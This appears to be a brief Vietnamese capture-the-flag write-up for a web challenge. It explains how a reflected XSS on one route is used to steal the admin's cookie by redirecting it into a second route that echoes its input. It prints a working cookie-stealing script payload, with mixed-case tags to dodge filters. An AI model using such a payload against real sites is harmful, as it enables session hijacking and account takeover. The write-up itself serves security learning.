ban đầu đọc hơi lú nhưng mà ta có thể thấy được có 2 route chính là memo?memo=any
thì sẽ hiển thị ra nội dung any trong đó
còn route param?param=any thì bị dính lỗi XSS cơ bản
bây giờ ý tưởng là sẽ gửi cookie của admin vào trong log của route memo
payload : <ScriPt>location.href="http://hostname:port/memo?memo="+document.cookie</ScriPt>
Và vào lại route kia để nhận cookie được render ra thôi
Flag: có làm thì hehe :v
